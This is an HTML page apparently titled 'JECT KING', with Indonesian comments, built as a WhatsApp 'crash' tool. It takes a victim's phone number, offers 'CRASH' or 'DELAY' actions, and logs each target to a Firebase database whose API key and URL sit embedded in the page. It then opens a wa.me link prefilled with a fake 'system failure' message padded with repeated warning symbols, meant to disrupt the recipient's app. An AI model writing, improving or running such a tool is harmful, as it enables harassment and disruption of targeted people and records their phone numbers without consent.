<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JECT KING</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        body { 
            background: #000; color: #bf00ff; font-family: 'Courier New', monospace; 
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; margin: 0; 
        }
        .container { 
            background: #0d0d0d; padding: 30px; border-radius: 15px; 
            box-shadow: 0 0 20px #4a0072; border: 1px solid #bf00ff; 
            text-align: center; width: 300px; 
        }
        input, select, button { 
            width: 100%; margin: 10px 0; padding: 12px; 
            background: #000; border: 1px solid #bf00ff; color: #bf00ff; 
            border-radius: 5px; box-sizing: border-box;
        }
        button { cursor: pointer; font-weight: bold; text-transform: uppercase; }
        button:hover { background: #bf00ff; color: #000; }
    </style>
</head>
<body>

<div class="container">
    <h3>JECT KING</h3>
    <input type="text" id="waNumber" placeholder="628+++">
    <select id="actionType">
        <option value="Crash">CRASH</option>
        <option value="Delay">DELAY</option>
    </select>
    <button onclick="sendAction()">SEND</button>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyD2-buF7sMfF2kR3A-uGNEj34TZ6lDl8NU",
        databaseURL: "https://myauthsystem-55ca0-default-rtdb.firebaseio.com",
        projectId: "myauthsystem-55ca0",
        storageBucket: "myauthsystem-55ca0.firebasestorage.app"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function sendAction() {
        const phone = document.getElementById('waNumber').value;
        const action = document.getElementById('actionType').value;
        
        // Payload teks panjang dengan karakter "invalid channel" dan "crash"
        const crashPayload = "⚠ SYSTEM_FAILURE_DETECTION ⚠ \n" + 
                             "Saluran Tidak Valid: 0x000000FF \n" +
                             "Diteruskan dari: SERVER_ROOT_ADMIN \n" +
                             "⚠ ".repeat(50) + "\n" +
                             "ERROR_CODE_CRASH_READY_STATE_404";

        if (phone) {
            db.ref('logs/').push({
                target: phone,
                type: action,
                status: "Executed",
                timestamp: Date.now()
            }).then(() => {
                // Mengirim ke WA dengan payload crash
                window.location.href = `https://wa.me/${phone}?text=${encodeURIComponent(crashPayload)}`;
            }).catch((e) => alert("Firebase Error: " + e.message));
        } else {
            alert("Masukkan nomor target!");
        }
    }
</script>
</body>
</html>
